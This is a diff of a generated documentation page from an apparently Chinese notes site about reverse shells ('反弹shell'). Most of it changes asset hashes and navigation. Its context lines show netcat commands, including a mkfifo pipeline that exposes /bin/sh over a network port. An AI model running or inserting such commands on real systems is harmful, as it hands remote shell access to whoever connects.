@@ -11,7 +11,7 @@
       
       
       <link rel="shortcut icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.2.2">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.2.3">
     
     
       
@@ -19,7 +19,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.a2408e81.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6e35a1a6.min.css">
       
         <link rel="stylesheet" href="../../../assets/stylesheets/palette.a46bcfb3.min.css">
       
@@ -57,7 +57,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#bash" class="md-skip">
+        <a href="#ncshell" class="md-skip">
           跳转至
         </a>
       
@@ -2636,6 +2636,18 @@
 
 
   <li class="md-nav__item">
+    <a href="../../linux/kernel/linux-debugfs/" title="Linux debugfs" class="md-nav__link">
+      Linux debugfs
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
     <a href="../../linux/kernel/linux-list/" title="Linux list" class="md-nav__link">
       Linux list
     </a>
@@ -3626,6 +3638,13 @@
       目录
     </label>
     <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ncshell" class="md-nav__link">
+    nc做反弹shell
+  </a>
+  
+</li>
       
         <li class="md-nav__item">
   <a href="#bash" class="md-nav__link">
@@ -5141,6 +5160,13 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#ncshell" class="md-nav__link">
+    nc做反弹shell
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#bash" class="md-nav__link">
     Bash
   </a>
@@ -5179,8 +5205,8 @@
                 
                   <h1>反弹shell</h1>
                 
-                <p>nc做反弹shell
-<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a>
+                <h2 id="ncshell">nc做反弹shell<a class="headerlink" href="#ncshell" title="Permanent link">&para;</a></h2>
+<p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a>
 <a href="https://www.freebuf.com/articles/system/10632.html">https://www.freebuf.com/articles/system/10632.html</a></p>
 <p>用这个接住：</p>
 <div class="highlight"><pre><span></span><code>$ nc -l -p 2333 -vvv
@@ -5271,14 +5297,14 @@ $ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f |/bin/sh -i 2&gt;&amp;1 |nc -l -p 2333
     </div>
     
       <script src="../../../assets/javascripts/vendor.d710d30a.min.js"></script>
-      <script src="../../../assets/javascripts/bundle.5f27aba8.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\uff0c\\u3002]+", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c"}</script>
+      <script src="../../../assets/javascripts/bundle.a45f732b.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\uff0c\\u3002]+", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c"}</script>
       
       <script>
         app = initialize({
           base: "../../..",
           features: [],
           search: Object.assign({
-            worker: "../../../assets/javascripts/worker/search.27c6a5e6.min.js"
+            worker: "../../../assets/javascripts/worker/search.c03f0417.min.js"
           }, typeof search !== "undefined" && search)
         })
       </script>
